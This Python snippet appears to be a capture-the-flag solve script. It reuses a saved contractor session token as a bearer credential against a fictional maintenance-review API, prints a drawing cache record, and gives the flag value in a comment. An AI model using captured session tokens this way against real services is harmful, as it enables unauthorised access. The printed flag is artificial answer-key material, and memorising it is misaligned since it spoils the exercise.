```python
import json, ssl, urllib.request, pathlib

ctx = ssl.create_default_context(cafile="/tmp/arwc-ca.crt")
contractor = pathlib.Path("receipts/contractor-session").read_text().strip()
h = {"Authorization": "Bearer " + contractor, "X-ARWC-Tenant": "arwc"}

d = json.loads(urllib.request.urlopen(
    urllib.request.Request("https://maintenance-review.arwc.test/api/drawing-cache/current", headers=h),
    context=ctx).read())
rec = d["record"]
print("drawing:", rec["drawing"])              # DRW-OG2-R8
print("cache_key_path:", rec["cache_key_path"])
print("drawing_revision:", rec["drawing_revision"])
print("flag:", d["flag"])                      # FLAG{0fba33d55c2cc299}
```
